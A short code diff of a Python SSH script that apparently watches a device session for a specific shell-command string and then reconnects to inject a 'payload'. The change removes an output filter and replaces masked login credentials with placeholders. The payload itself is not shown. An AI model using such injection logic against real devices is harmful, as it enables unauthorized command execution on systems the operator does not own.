@@ -26,14 +26,13 @@ def channel_intercept():
                 transport.close()
                 write("Press enter to exit...")
                 break
-            if not (data == " > " or payload in data):
-                if "prctl_runCommandInShellWithTimeout" in data:
-                    transport.close()
-                    init()
-                    session.send("%s\n" % payload)
-                    channel_intercept()
-                else:
-                    write(data)
+            if "prctl_runCommandInShellWithTimeout" in data:
+                transport.close()
+                init()
+                session.send("%s\n" % payload)
+                channel_intercept()
+            else:
+                write(data)
     except KeyboardInterrupt:
         stopbinding = True
         transport.close()
@@ -63,7 +62,7 @@ def init():
             sys.exit(1)
 
         if not transport.is_authenticated():
-            transport.auth_password("**", "**")
+            transport.auth_password("username", "password")
         if not transport.is_authenticated():
             write("Authentication failed.")
             transport.close()
